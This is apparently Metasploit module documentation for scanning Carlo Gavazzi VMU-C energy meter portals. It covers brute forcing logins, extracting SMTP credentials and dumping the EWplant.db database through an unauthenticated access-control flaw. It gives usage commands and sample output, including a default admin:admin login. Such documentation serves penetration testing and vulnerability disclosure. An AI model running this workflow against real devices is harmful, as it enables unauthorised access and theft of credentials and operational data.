This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration.
A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication.

The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db.
This db file contains information such as power/energy utilization data, tariffs, and revenue statistics.

Vulnerable firmware versions include:

* VMU-C EM prior to firmware Version A11_U05
* VMU-C PV prior to firmware Version A17.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/gavazzi_em_login_loot```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

  ```
msf > use auxiliary/scanner/http/gavazzi_em_login_loot
msf auxiliary(gavazzi_em_login_loot) > set rhosts 1.3.3.7
msf auxiliary(gavazzi_em_login_loot) > set rport 80
msf auxiliary(gavazzi_em_login_loot) > run

[+] 1.3.3.7:80 - [1/1] - Running Carlo Gavazzi VMU-C Web Management portal...
[*] 1.3.3.7:80 - [1/1] - Trying username:"admin" with password:"admin"
[+] SUCCESSFUL LOGIN - 1.3.3.7:80 - "admin":"admin"
[+] 1.3.3.7:80 - Firmware version A8_U03...
[+] 1.3.3.7:80 - SMTP server: "", SMTP username: "", SMTP password: ""
[*] 1.3.3.7:80 - dumping EWplant.db
[+] 1.3.3.7:80 - EWplant.db retrieved successfully!
[+] 1.3.3.7:80 - File saved in: /root/.msf4/loot/20000000000005_moduletest_1.3.3.7_EWplant.db_501578.db
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

  ```
